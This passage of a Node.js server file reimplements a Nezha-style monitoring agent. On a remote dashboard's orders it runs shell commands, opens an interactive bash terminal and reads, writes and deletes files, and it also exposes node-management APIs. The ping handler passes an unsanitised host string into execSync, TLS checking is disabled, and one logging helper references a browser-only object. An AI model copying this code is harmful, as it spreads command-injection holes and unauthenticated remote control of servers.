                        await nezhaPureSendUnary(nezhaPureH2Session, '/proto.NezhaService/ReportGeoIP', geoipBuf, currentAuthHeaders);
                    }
                } catch(e) {}
                scheduleGeoIP();
            }, delay);
        };
        scheduleGeoIP();
    };
    const sendTaskResult = (result) => {
        try {
            if (nezhaPureTaskStream && !nezhaPureTaskStream.destroyed && !nezhaPureTaskStream.closed) {
                const resultBuf = NezhaMsg.encodeTaskResult(result);
                nezhaPureTaskStream.write(PB.frame(resultBuf));
            }
        } catch(e) {}
    };
    const handleHTTPGetTask = (taskId, taskData) => {
        let url = '', method = 'GET', headers = {};
        try {
            const cfg = JSON.parse(taskData);
            url = cfg.url || '';
            method = cfg.method || 'GET';
            headers = cfg.headers || {};
        } catch(e) {
            url = taskData;
        }
        if (!url) {
            sendTaskResult({ id: taskId, type: 1, delay: 0, data: 'URL为空', successful: false });
            return;
        }
        const startTime = Date.now();
        axios({ url, method, headers, timeout: 10000, validateStatus: () => true, maxRedirects: 5 })
            .then(res => {
                const delay = Date.now() - startTime;
                sendTaskResult({
                    id: taskId, type: 1, delay,
                    data: `${res.status} ${res.statusText || ''}`,
                    successful: res.status >= 200 && res.status < 400
                });
            })
            .catch(err => {
                const delay = Date.now() - startTime;
                sendTaskResult({
                    id: taskId, type: 1, delay,
                    data: err.message || '请求失败',
                    successful: false
                });
            });
    };
    const handleICMPPingTask = (taskId, taskData) => {
        let host = '';
        try { const cfg = JSON.parse(taskData); host = cfg.host || cfg.address || ''; } catch(e) { host = taskData.trim(); }
        if (!host) {
            sendTaskResult({ id: taskId, type: 2, delay: 0, data: 'Host为空', successful: false });
            return;
        }
        const isWin = os.platform() === 'win32';
        const pingCmd = isWin ? `ping -n 3 ${host}` : `ping -c 3 -W 5 ${host}`;
        const startTime = Date.now();
        try {
            const output = require('child_process').execSync(pingCmd, { timeout: 15000, encoding: 'utf8' }).toString();
            const delay = Date.now() - startTime;
            let avgDelay = delay;
            const avgMatch = output.match(isWin ? /Average\s*=\s*([\d.]+)/ms : /min\/avg\/max.*?=\s*([\d.]+)\/([\d.]+)\/([\d.]+)/);
            if (avgMatch) {
                avgDelay = isWin ? parseFloat(avgMatch[1]) : parseFloat(avgMatch[2]);
            }
            sendTaskResult({ id: taskId, type: 2, delay: avgDelay, data: output.substring(0, 500), successful: true });
        } catch(e) {
            sendTaskResult({ id: taskId, type: 2, delay: Date.now() - startTime, data: e.message || 'Ping失败', successful: false });
        }
    };
    const handleTCPPingTask = (taskId, taskData) => {
        let host = '', port = 80;
        try {
            const cfg = JSON.parse(taskData);
            host = cfg.host || cfg.address || '';
            port = parseInt(cfg.port) || 80;
        } catch(e) {
            const parts = taskData.trim().split(':');
            host = parts[0]; port = parseInt(parts[1]) || 80;
        }
        if (!host) {
            sendTaskResult({ id: taskId, type: 3, delay: 0, data: 'Host为空', successful: false });
            return;
        }
        const startTime = Date.now();
        const netMod = require('net');
        const sock = new netMod.Socket();
        sock.setTimeout(5000);
        sock.on('connect', () => {
            const delay = Date.now() - startTime;
            sock.destroy();
            sendTaskResult({ id: taskId, type: 3, delay, data: `${host}:${port} 连接成功`, successful: true });
        });
        sock.on('timeout', () => {
            sock.destroy();
            sendTaskResult({ id: taskId, type: 3, delay: Date.now() - startTime, data: `${host}:${port} 连接超时`, successful: false });
        });
        sock.on('error', (err) => {
            sock.destroy();
            sendTaskResult({ id: taskId, type: 3, delay: Date.now() - startTime, data: `${host}:${port} ${err.message}`, successful: false });
        });
        sock.connect(port, host);
    };
    const handleCommandTask = (taskId, taskData) => {
        let cmd = '', cwd = '/';
        try {
            const cfg = JSON.parse(taskData);
            cmd = cfg.command || cfg.cmd || '';
            cwd = cfg.cwd || cfg.dir || '/';
        } catch(e) {
            cmd = taskData.trim();
        }
        if (!cmd) {
            sendTaskResult({ id: taskId, type: 4, delay: 0, data: '命令为空', successful: false });
            return;
        }
        const startTime = Date.now();
        try {
            const output = require('child_process').execSync(cmd, {
                timeout: 30000, encoding: 'utf8', cwd,
                maxBuffer: 1024 * 1024
            }).toString();
            const delay = Date.now() - startTime;
            sendTaskResult({ id: taskId, type: 4, delay, data: output.substring(0, 4096), successful: true });
        } catch(e) {
            const delay = Date.now() - startTime;
            const output = (e.stdout || '') + (e.stderr || '') || e.message;
            sendTaskResult({ id: taskId, type: 4, delay, data: output.substring(0, 4096), successful: false });
        }
    };
    const handleFsListTask = (taskId, taskData) => {
        let dirPath = '/';
        try { const cfg = JSON.parse(taskData); dirPath = cfg.path || cfg.dir || '/'; } catch(e) { dirPath = taskData.trim() || '/'; }
        handleFMTask(taskId, JSON.stringify({ path: dirPath, cmd: 'list' }));
    };
    const handleFsReadTask = (taskId, taskData) => {
        let filePath = '';
        try { const cfg = JSON.parse(taskData); filePath = cfg.path || cfg.file || ''; } catch(e) { filePath = taskData.trim(); }
        handleFMTask(taskId, JSON.stringify({ path: filePath, cmd: 'download' }));
    };
    const handleFsWriteTask = (taskId, taskData) => {
        handleFMTask(taskId, taskData);
    };
    const handleFsDeleteTask = (taskId, taskData) => {
        let targetPath = '', recursive = false;
        try { const cfg = JSON.parse(taskData); targetPath = cfg.path || cfg.file || ''; recursive = cfg.recursive || false; } catch(e) { targetPath = taskData.trim(); }
        if (!targetPath) {
            sendTaskResult({ id: taskId, type: 19, delay: 0, data: '路径为空', successful: false });
            return;
        }
        const startTime = Date.now();
        try {
            const stat = fsSync.statSync(targetPath);
            if (stat.isDirectory()) {
                fsSync.rmSync(targetPath, { recursive: true, force: true });
            } else {
                fsSync.unlinkSync(targetPath);
            }
            sendTaskResult({ id: taskId, type: 19, delay: Date.now() - startTime, data: `已删除: ${targetPath}`, successful: true });
        } catch(e) {
            sendTaskResult({ id: taskId, type: 19, delay: Date.now() - startTime, data: e.message || '删除失败', successful: false });
        }
    };
    const handleFsTransferTask = (taskId, taskData) => {
        handleFMTask(taskId, taskData);
    };
    const handleTerminalTask = (taskId, taskData) => {
        try {
            let streamId = '';
            try {
                const parsed = JSON.parse(taskData);
                streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
            } catch(e) {
                streamId = taskData;
            }
            if (!streamId) {
                return;
            }

            const terminalKey = streamId;
            if (activeTerminals.has(terminalKey)) return;
            const ioStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/IOStream',
                currentAuthHeaders,
                (frameData) => {
                    try {
                        let inputData = null;
                        let off = 0;
                        while (off < frameData.length) {
                            const tag = PB.decodeVarint(frameData, off);
                            off = tag.off;
                            const fieldNum = tag.val >> 3;
                            const wireType = tag.val & 0x07;
                            if (wireType === 2 && fieldNum === 1) {
                                const len = PB.decodeVarint(frameData, off);
                                off = len.off;
                                inputData = frameData.slice(off, off + len.val);
                                off += len.val;
                            } else if (wireType === 0) {
                                const val = PB.decodeVarint(frameData, off);
                                off = val.off;
                            } else { break; }
                        }
                        const term = activeTerminals.get(terminalKey);
                        if (!inputData || !term) return;
                        if (inputData.length === 0) return;
                        const dataType = inputData[0];
                        const payload = inputData.slice(1);
                        if (dataType === 0) {
                            if (term.pty.stdin.writable) {
                                term.pty.stdin.write(payload);
                            }
                        } else if (dataType === 1) {
                            try {
                                const resize = JSON.parse(payload.toString('utf8'));
                                if (term.pty.stdout && term.pty.stdout._handle && term.pty.stdout._handle.setWindowSize) {
                                    term.pty.stdout._handle.setWindowSize(resize.Cols || 80, resize.Rows || 24);
                                }
                            } catch(e) {}
                        }
                    } catch(e) {}
                },
                (trailers) => {
                    const term = activeTerminals.get(terminalKey);
                    if (term) {
                        try { term.pty.kill(); } catch(e) {}
                        if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
                        if (term.rcFile) { try { fsSync.unlinkSync(term.rcFile); } catch(e) {} }
                        activeTerminals.delete(terminalKey);
                    }
                }
            );
            try {
                const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
                const streamIdBuf = Buffer.from(streamId);
                const handshake = Buffer.concat([magic, streamIdBuf]);
                const handshakeMsg = PB.bytes(1, handshake);
                ioStream.write(PB.frame(handshakeMsg));
            } catch(e) {
            }

            const { spawn } = require('child_process');
            const os = require('os');
            const _hasBash = fsSync.existsSync('/bin/bash');
            const shell = _hasBash ? '/bin/bash' : (process.env.SHELL || '/bin/sh');
            let _termRcFile = null;
            if (_hasBash) {
                try {
                    const bashRcParts = [
                        '[ -f /etc/profile ] && . /etc/profile 2>/dev/null',
                        '[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc 2>/dev/null',
                        '[ -f ~/.bashrc ] && . ~/.bashrc 2>/dev/null',
                    ];
                    const BS = String.fromCharCode(92);
                    const SQ = String.fromCharCode(39);
                    const ps1Val = BS + '[' + BS + 'e]0;' + BS + 'u@' + BS + 'h:' + BS + 'w' + BS + 'a' + BS + ']' +
                        BS + '[' + BS + 'e[01;32m' + BS + ']' + BS + 'u@' + BS + 'h' +
                        BS + '[' + BS + 'e[00m' + BS + ']:' +
                        BS + '[' + BS + 'e[01;34m' + BS + ']' + BS + 'w' +
                        BS + '[' + BS + 'e[00m' + BS + ']' + BS + '$ ';
                    bashRcParts.push('export PS1=' + SQ + ps1Val + SQ);
                    const rcContent = bashRcParts.join('\n');
                    _termRcFile = path.join(os.tmpdir(), '.nezha_rc_' + streamId);
                    fsSync.writeFileSync(_termRcFile, rcContent);
                } catch(e) { _termRcFile = null; }
            }
            let pty;
            try {
                const bashCmd = _termRcFile
                    ? '/bin/bash --rcfile ' + _termRcFile
                    : shell;
                pty = spawn('/usr/bin/script', ['-qfc', bashCmd, '/dev/null'], {
                    env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                    stdio: ['pipe', 'pipe', 'pipe'],
                });
            } catch(e) {
                try {
                    pty = spawn(shell, ['-i'], {
                        env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                        stdio: ['pipe', 'pipe', 'pipe'],
                    });
                } catch(e2) {
                    pty = spawn('/bin/sh', ['-i'], {
                        env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                        stdio: ['pipe', 'pipe', 'pipe'],
                    });
                }
            }

            const keepaliveTimer = setInterval(() => {
                try {
                    if (ioStream && !ioStream.destroyed && ioStream.writable) {
                        ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
                    } else {
                        clearInterval(keepaliveTimer);
                    }
                } catch(e) { clearInterval(keepaliveTimer); }
            }, 30000);
            const terminal = { stream: ioStream, pty, keepaliveTimer, rcFile: _termRcFile };
            activeTerminals.set(terminalKey, terminal);
            const sendOutput = (data) => {
                try {
                    if (ioStream && !ioStream.destroyed && ioStream.writable) {
                        const ioData = PB.bytes(1, data);
                        ioStream.write(PB.frame(ioData));
                    }
                } catch(e) {}
            };
            pty.stdout.on('data', sendOutput);
            pty.stderr.on('data', sendOutput);
            pty.on('exit', () => {
                try { ioStream.end(); } catch(e) {}
                clearInterval(keepaliveTimer);
                activeTerminals.delete(terminalKey);
                if (_termRcFile) { try { fsSync.unlinkSync(_termRcFile); } catch(e) {} }
            });
        } catch(e) {
        }
    };
    const handleFMTask = (taskId, taskData) => {
        try {
            let streamId = '';
            try {
                const parsed = JSON.parse(taskData);
                streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
            } catch(e) {
                streamId = taskData;
            }
            if (!streamId) return;
            if (activeFMSessions.has(streamId)) return;
            const ioStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/IOStream',
                currentAuthHeaders,
                (frameData) => {
                    try {
                        let data = null;
                        let off = 0;
                        while (off < frameData.length) {
                            const tag = PB.decodeVarint(frameData, off);
                            off = tag.off;
                            const fieldNum = tag.val >> 3;
                            const wireType = tag.val & 0x07;
                            if (wireType === 2 && fieldNum === 1) {
                                const len = PB.decodeVarint(frameData, off);
                                off = len.off;
                                data = frameData.slice(off, off + len.val);
                                off += len.val;
                            } else if (wireType === 0) {
                                const val = PB.decodeVarint(frameData, off);
                                off = val.off;
                            } else { break; }
                        }
                        if (!data || data.length === 0) return;
                        const fmSession = activeFMSessions.get(streamId);
                        if (fmSession && fmSession.uploadStream && !fmSession.uploadStream.closed) {
                            fmSession.uploadStream.write(data);
                            fmSession.uploadReceived = (fmSession.uploadReceived || 0) + data.length;
                            if (fmSession.uploadReceived >= fmSession.uploadSize) {
                                fmSession.uploadStream.end();
                                fmSession.uploadStream = null;
                                const nzup = Buffer.from('NZUP');
                                ioStream.write(PB.frame(PB.bytes(1, nzup)));
                            }
                            return;
                        }

                        const cmd = data[0];
                        if (cmd === 0) {
                            const dirPath = data.slice(1).toString('utf8') || '/';
                            fmListDir(ioStream, dirPath);
                        } else if (cmd === 1) {
                            const filePath = data.slice(1).toString('utf8');
                            fmDownloadFile(ioStream, filePath);
                        } else if (cmd === 2) {
                            fmReceiveUpload(ioStream, data.slice(1), streamId);
                        } else if (cmd === 3) {
                            const delPath = data.slice(1).toString('utf8');
                            fmDeletePath(ioStream, delPath);
                        } else if (cmd === 4) {
                            fmRenamePath(ioStream, data.slice(1));
                        } else if (cmd === 5) {
                            const mkDir = data.slice(1).toString('utf8');
                            fmCreateDir(ioStream, mkDir);
                        }
                    } catch(e) {}
                },
                (trailers) => {
                    const fm = activeFMSessions.get(streamId);
                    if (fm) {
                        if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
                        activeFMSessions.delete(streamId);
                    }
                }
            );
            try {
                const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
                const streamIdBuf = Buffer.from(streamId);
                const handshake = Buffer.concat([magic, streamIdBuf]);
                ioStream.write(PB.frame(PB.bytes(1, handshake)));
            } catch(e) {}

            const keepaliveTimer = setInterval(() => {
                try {
                    if (ioStream && !ioStream.destroyed && ioStream.writable) {
                        ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
                    } else { clearInterval(keepaliveTimer); }
                } catch(e) { clearInterval(keepaliveTimer); }
            }, 30000);
            activeFMSessions.set(streamId, { stream: ioStream, keepaliveTimer });
        } catch(e) {}
    };
    const fmListDir = (ioStream, dirPath) => {
        try {
            const nzfn = Buffer.from('NZFN');
            const pathBuf = Buffer.from(dirPath, 'utf8');
            const pathLenBuf = Buffer.alloc(4);
            pathLenBuf.writeUInt32BE(pathBuf.length, 0);
            const entryBufs = [];
            let hasError = false;
            let errData = null;
            try {
                const items = fsSync.readdirSync(dirPath, { withFileTypes: true });
                for (const item of items) {
                    try {
                        const isDir = item.isDirectory() ? 1 : 0;
                        const nameBuf = Buffer.from(item.name, 'utf8');
                        if (nameBuf.length <= 255) {
                            entryBufs.push(Buffer.from([isDir, nameBuf.length]));
                            entryBufs.push(nameBuf);
                        }
                    } catch(e) {}
                }
            } catch(e) {
                hasError = true;
                const nerr = Buffer.from('NERR');
                const errMsg = Buffer.from(e.message || 'Permission denied', 'utf8');
                errData = Buffer.concat([nerr, errMsg]);
            }

            if (hasError) {
                const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, errData]);
                ioStream.write(PB.frame(PB.bytes(1, msgData)));
            } else if (entryBufs.length > 0) {
                const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, ...entryBufs]);
                ioStream.write(PB.frame(PB.bytes(1, msgData)));
            } else {
                const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf]);
                ioStream.write(PB.frame(PB.bytes(1, msgData)));
            }
        } catch(e) {}
    };
    const fmDownloadFile = (ioStream, filePath) => {
        try {
            let stat;
            try {
                stat = fsSync.statSync(filePath);
                if (stat.isDirectory()) throw new Error('Is a directory');
            } catch(e) {
                const nerr = Buffer.from('NERR');
                const errMsg = Buffer.from(e.message || 'File not found', 'utf8');
                ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
                return;
            }

            const nztd = Buffer.from('NZTD');
            const sizeBuf = Buffer.alloc(8);
            sizeBuf.writeUInt32BE(Math.floor(stat.size / 0x100000000), 0);
            sizeBuf.writeUInt32BE(stat.size & 0xFFFFFFFF, 4);
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nztd, sizeBuf]))));
            const readStream = fsSync.createReadStream(filePath, { highWaterMark: 1024 * 1024 });
            readStream.on('data', (chunk) => {
                try {
                    if (ioStream && !ioStream.destroyed && ioStream.writable) {
                        ioStream.write(PB.frame(PB.bytes(1, chunk)));
                    } else {
                        readStream.destroy();
                    }
                } catch(e) { readStream.destroy(); }
            });
            readStream.on('error', () => {});
            readStream.on('end', () => {});
        } catch(e) {}
    };
    const fmReceiveUpload = (ioStream, initialData, streamId) => {
        try {
            if (initialData.length < 8) return;
            const fileSizeHigh = initialData.readUInt32BE(0);
            const fileSizeLow = initialData.readUInt32BE(4);
            const fileSize = fileSizeHigh * 0x100000000 + fileSizeLow;
            const filePath = initialData.slice(8).toString('utf8');
            if (!filePath) return;
            const dir = path.dirname(filePath);
            try { fsSync.mkdirSync(dir, { recursive: true }); } catch(e) {}
            const writeStream = fsSync.createWriteStream(filePath);
            const fmSession = activeFMSessions.get(streamId);
            if (fmSession) {
                fmSession.uploadStream = writeStream;
                fmSession.uploadSize = fileSize;
                fmSession.uploadReceived = 0;
            }
        } catch(e) {}
    };
    const fmDeletePath = (ioStream, delPath) => {
        try {
            if (!delPath) return;
            const stat = fsSync.statSync(delPath);
            if (stat.isDirectory()) {
                fsSync.rmSync(delPath, { recursive: true, force: true });
            } else {
                fsSync.unlinkSync(delPath);
            }
            const nzfn = Buffer.from('NZFN');
            const pathBuf = Buffer.from(path.dirname(delPath), 'utf8');
            const pathLenBuf = Buffer.alloc(4);
            pathLenBuf.writeUInt32BE(pathBuf.length, 0);
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nzfn, pathLenBuf, pathBuf]))));
        } catch(e) {
            const nerr = Buffer.from('NERR');
            const errMsg = Buffer.from(e.message || '删除失败', 'utf8');
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
        }
    };
    const fmRenamePath = (ioStream, payload) => {
        try {
            if (payload.length < 4) return;
            const oldPathLen = payload.readUInt32BE(0);
            if (payload.length < 4 + oldPathLen) return;
            const oldPath = payload.slice(4, 4 + oldPathLen).toString('utf8');
            const newPath = payload.slice(4 + oldPathLen).toString('utf8');
            if (!oldPath || !newPath) return;
            fsSync.renameSync(oldPath, newPath);
            fmListDir(ioStream, path.dirname(newPath));
        } catch(e) {
            const nerr = Buffer.from('NERR');
            const errMsg = Buffer.from(e.message || '重命名失败', 'utf8');
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
        }
    };
    const fmCreateDir = (ioStream, dirPath) => {
        try {
            if (!dirPath) return;
            fsSync.mkdirSync(dirPath, { recursive: true });
            fmListDir(ioStream, dirPath);
        } catch(e) {
            const nerr = Buffer.from('NERR');
            const errMsg = Buffer.from(e.message || '创建目录失败', 'utf8');
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
        }
    };
    const connectInternal = async () => {
        if (!nezhaPureRunning) return;
        try {
            const h2 = require('http2');
            const h2Opts = useTls ? {
                rejectUnauthorized: false,
                settings: {
                    enablePush: false,
                },
            } : {
                settings: {
                    enablePush: false,
                },
            };
            const waitForH2Connect = (session) => new Promise((resolve, reject) => {
                let settled = false;
                session.on('connect', () => {
                    if (settled) return; settled = true;
                    resolve(session);
                });
                session.on('error', (err) => {
                    if (settled) return; settled = true;
                    reject(err);
                });
                session.on('close', () => {
                    if (settled) return; settled = true;
                    reject(new Error('H2 session closed before connect'));
                });
            });
            nezhaPureH2Session = h2.connect(connectURL, h2Opts);
            try {
                await waitForH2Connect(nezhaPureH2Session);
            } catch (connectErr) {
                pushNezhaLog('❌ 连接失败: ' + ((connectErr && connectErr.message) || '未知错误'), 'text-red-500');
                fullReconnect();
                return;
            }
            pushNezhaLog('✅ 已连接哪吒服务器: ' + connectURL, 'text-emerald-400 font-bold');

            try {
                const socket = nezhaPureH2Session.session?.socket || nezhaPureH2Session.socket;
                if (socket && typeof socket.setKeepAlive === 'function') {
                    socket.setKeepAlive(true, 10000);
                }
            } catch(e) {}
            nezhaPureH2Session.on('error', (err) => {
                fullReconnect();
            });
            nezhaPureH2Session.on('close', () => {
                if (nezhaPureRunning) fullReconnect();
            });
            nezhaPureH2Session.on('goaway', (errorCode, lastStreamID) => {
                if (nezhaPureRunning) {
                    fullReconnect();
                }
            });
            let hostInfoReported = false;
            try {
                const hostBuf = NezhaMsg.encodeHost(hostInfo);
                const infoResult = await nezhaPureSendUnary(nezhaPureH2Session, '/proto.NezhaService/ReportSystemInfo', hostBuf, currentAuthHeaders);
                hostInfoReported = true;
                let proceed = true;
                if (infoResult && infoResult.length >= 2) {
                    try {
                        if (infoResult[0] === 0x08) {
                            proceed = infoResult[1] === 0x01;
                        }
                    } catch(e) {}
                }
                if (!proceed) {
                }
            } catch (e) {
                hostInfoReported = false;
                const errMsg = (e && e.message) || '';
                if (errMsg.includes('UNIQUE constraint') || errMsg.includes('duplicate') || errMsg.includes('already exists')) {
                    currentUUID = generateIPBasedUUID(currentIP || hostInfo.ip || crypto.randomBytes(8).toString('hex'));
                    nezhaConfig.uuid = currentUUID;
                    try { await saveNezhaConfig(); } catch(se) {}
                    currentAuthHeaders['client-uuid'] = currentUUID;
                    currentAuthHeaders['client_uuid'] = currentUUID;
                    try {
                        const hostBuf2 = NezhaMsg.encodeHost(hostInfo);
                        await nezhaPureSendUnary(nezhaPureH2Session, '/proto.NezhaService/ReportSystemInfo', hostBuf2, currentAuthHeaders);
                        hostInfoReported = true;
                    } catch(retryErr) {
                    }
                }
            }

            try {
                const ipv4 = hostInfo.ip || '';
                if (ipv4) {
                    const geoipBuf = NezhaMsg.encodeGeoIP(ipv4, '');
                    const geoipResult = await nezhaPureSendUnary(nezhaPureH2Session, '/proto.NezhaService/ReportGeoIP', geoipBuf, currentAuthHeaders);
                }
            } catch (e) {
            }
            nezhaPureTaskStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/RequestTask',
                currentAuthHeaders,
                (frameData) => {
                    try {
                        let taskId = 0, taskType = 0, taskData = '';
                        let off = 0;
                        while (off < frameData.length) {
                            const tag = PB.decodeVarint(frameData, off);
                            off = tag.off;
                            const fieldNum = tag.val >> 3;
                            const wireType = tag.val & 0x07;
                            if (wireType === 0) {
                                const val = PB.decodeVarint(frameData, off);
                                off = val.off;
                                if (fieldNum === 1) taskId = val.val;
                                else if (fieldNum === 2) taskType = val.val;
                            } else if (wireType === 2) {
                                const len = PB.decodeVarint(frameData, off);
                                off = len.off;
                                const strBytes = frameData.slice(off, off + len.val);
                                off += len.val;
                                if (fieldNum === 3) taskData = strBytes.toString('utf8');
                            } else {
                                break;
                            }
                        }
                        if (taskType === 8) {
                            handleTerminalTask(taskId, taskData);
                        } else if (taskType === 11) {
                            handleFMTask(taskId, taskData);
                        } else if (taskType === 7) {
                        } else if (taskType === 1) {
                            handleHTTPGetTask(taskId, taskData);
                        } else if (taskType === 2) {
                            handleICMPPingTask(taskId, taskData);
                        } else if (taskType === 3) {
                            handleTCPPingTask(taskId, taskData);
                        } else if (taskType === 4) {
                            handleCommandTask(taskId, taskData);
                        } else if (taskType === 5) {
                        } else if (taskType === 6) {
                        } else if (taskType === 15) {
                            handleCommandTask(taskId, taskData);
                        } else if (taskType === 16) {
                            handleFsListTask(taskId, taskData);
                        } else if (taskType === 17) {
                            handleFsReadTask(taskId, taskData);
                        } else if (taskType === 18) {
                            handleFsWriteTask(taskId, taskData);
                        } else if (taskType === 19) {
                            handleFsDeleteTask(taskId, taskData);
                        } else if (taskType === 20) {
                            handleFsTransferTask(taskId, taskData);
                        }
                    } catch(e) {}
                },
                (trailers) => {
                    if (nezhaPureRunning) reopenStreams();
                }
            );
            nezhaPureTaskStream.write(PB.frame(Buffer.alloc(0)));
            nezhaPureStateStream = nezhaPureOpenStream(
                nezhaPureH2Session,
                '/proto.NezhaService/ReportSystemState',
                currentAuthHeaders,
                (frameData) => { /* Receipt, 忽略 */ },
                (trailers) => {
                    if (nezhaPureRunning) reopenStreams();
                }
            );
            startStateTimer(hostInfoReported, hostInfo, true);
            startPingTimer();
            startGeoIPTimer();
            if (nezhaRestartTimer) { clearTimeout(nezhaRestartTimer); nezhaRestartTimer = null; }
            nezhaRestartAttempts = 0;
        } catch (err) {
            fullReconnect();
        }
    };
    await connectInternal();
}

function stopNezhaPure() {
    if (!nezhaPureRunning && !nezhaPureH2Session) return;
    pushNezhaLog('⏹️ 纯Node探针已停止', 'text-orange-400');
    nezhaPureRunning = false;
    if (nezhaPureReconnectTimer) { clearTimeout(nezhaPureReconnectTimer); nezhaPureReconnectTimer = null; }
    if (nezhaPurePingTimer) { clearTimeout(nezhaPurePingTimer); nezhaPurePingTimer = null; }
    if (nezhaPureGeoIPTimer) { clearTimeout(nezhaPureGeoIPTimer); nezhaPureGeoIPTimer = null; }
    if (nezhaPureStateTimer) { clearTimeout(nezhaPureStateTimer); nezhaPureStateTimer = null; }
    if (nezhaPureStateStream) { try { nezhaPureStateStream.end(); } catch(e) {} nezhaPureStateStream = null; }
    if (nezhaPureTaskStream) { try { nezhaPureTaskStream.end(); } catch(e) {} nezhaPureTaskStream = null; }
    if (nezhaPureH2Session) { try { nezhaPureH2Session.close(); } catch(e) {} nezhaPureH2Session = null; }
    nezhaPurePrevCpus = null;
    nezhaPurePrevCpuTotal = 0;
    nezhaPurePrevCpuBusy = 0;
    nezhaPureLastNetTime = 0;
}

// ===== 哪吒探针 API =====
app.get("/api/nezha/config", function(req, res) {
    res.json({
        addr: nezhaConfig.addr,
        key: nezhaConfig.key,
        tls: nezhaConfig.tls,
        mode: nezhaConfig.mode,
        uuid: nezhaConfig.uuid || '',
        running: nezhaPureRunning || nezhaProcess !== null
    });
});
app.post("/api/nezha/config", async function(req, res) {
    try {
        var p = req.body || {};
        if (p.addr) nezhaConfig.addr = p.addr;
        if (p.key) nezhaConfig.key = p.key;
        if (p.tls !== undefined) nezhaConfig.tls = !!p.tls;
        if (p.mode) nezhaConfig.mode = p.mode;
        nezhaUserStopped = false;
        await saveNezhaConfig();
        if (nezhaPureRunning) stopNezhaPure();
        if (nezhaProcess) { try { nezhaProcess.kill(); } catch(e) {} nezhaProcess = null; }
        if (nezhaConfig.addr && nezhaConfig.key) {
            if (nezhaConfig.mode === 'laowang') {
                await startNezha(nezhaConfig.addr, nezhaConfig.key, nezhaConfig.tls);
            } else {
                await startNezhaPure(nezhaConfig.addr, nezhaConfig.key, nezhaConfig.tls);
            }
        }
        res.json({ success: true });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.post("/api/nezha/stop", function(req, res) {
    nezhaUserStopped = true;
    if (nezhaPureRunning) stopNezhaPure();
    if (nezhaProcess) { try { nezhaProcess.kill(); } catch(e) {} nezhaProcess = null; }
    res.json({ success: true });
});
app.get("/api/nezha/logs", function(req, res) {
    res.json({ logs: nezhaLogs });
});

// ===== 节点管理 API =====
const NODE_CONFIG_FILE = path.join(__dirname, 'nodes_config.json');
let savedNodes = [];
let nodeProcesses = new Map();

function loadSavedNodes() {
    try {
        if (fsSync.existsSync(NODE_CONFIG_FILE)) {
            var data = JSON.parse(fsSync.readFileSync(NODE_CONFIG_FILE, 'utf8'));
            if (Array.isArray(data)) savedNodes = data;
        }
    } catch(e) {}
}
async function saveSavedNodes() {
    try { fsSync.writeFileSync(NODE_CONFIG_FILE, JSON.stringify(savedNodes, null, 2)); } catch(e) {}
}
loadSavedNodes();

function pushNodeLog(msg, color) {
    var box = document && document.getElementById ? document.getElementById('node-log-box') : null;
    var t = new Date().toLocaleTimeString('zh-CN', { hour12: false });
    try {
        var logBox = fsSync.existsSync(path.join(__dirname, 'node_runtime.log')) ? fsSync.readFileSync(path.join(__dirname, 'node_runtime.log'), 'utf8') : '';
        logBox = t + ' ' + msg + '\n' + logBox;
        if (logBox.length > 10000) logBox = logBox.substring(0, 10000);
        fsSync.writeFileSync(path.join(__dirname, 'node_runtime.log'), logBox);
    } catch(e) {}
}

app.get("/api/nodes", function(req, res) {
    res.json({ success: true, nodes: savedNodes });
});
app.post("/api/nodes", function(req, res) {
    try {
        var p = req.body || {};
        if (!p.name || !p.type) return res.status(400).json({ success: false, msg: "缺少名称或类型" });
        var node = {
            id: 'node_' + Math.random().toString(36).substr(2, 7),
            type: p.type || 'custom',
            name: p.name,
            server: p.server || '',
            port: p.port || '',
            key: p.key || '',
            argod: p.argod || '',
            argoa: p.argoa || '',
            mode: p.mode || 'pure',
            status: 'stopped',
            created: Date.now()
        };
        savedNodes.push(node);
        saveSavedNodes();
        pushNodeLog('✅ 节点已保存: ' + node.name, 'text-emerald-400');
        res.json({ success: true, node: node });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.put("/api/nodes/:id", function(req, res) {
    try {
        var node = savedNodes.find(function(n) { return n.id === req.params.id; });
        if (!node) return res.status(404).json({ success: false, msg: "节点不存在" });
        var p = req.body || {};
        if (p.name !== undefined) node.name = p.name;
        if (p.server !== undefined) node.server = p.server;
        if (p.port !== undefined) node.port = p.port;
        if (p.key !== undefined) node.key = p.key;
        if (p.type !== undefined) node.type = p.type;
        if (p.mode !== undefined) node.mode = p.mode;
        if (p.argod !== undefined) node.argod = p.argod;
        if (p.argoa !== undefined) node.argoa = p.argoa;
        saveSavedNodes();
        res.json({ success: true, node: node });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.delete("/api/nodes/:id", function(req, res) {
    try {
        var node = savedNodes.find(function(n) { return n.id === req.params.id; });
        if (!node) return res.status(404).json({ success: false, msg: "节点不存在" });
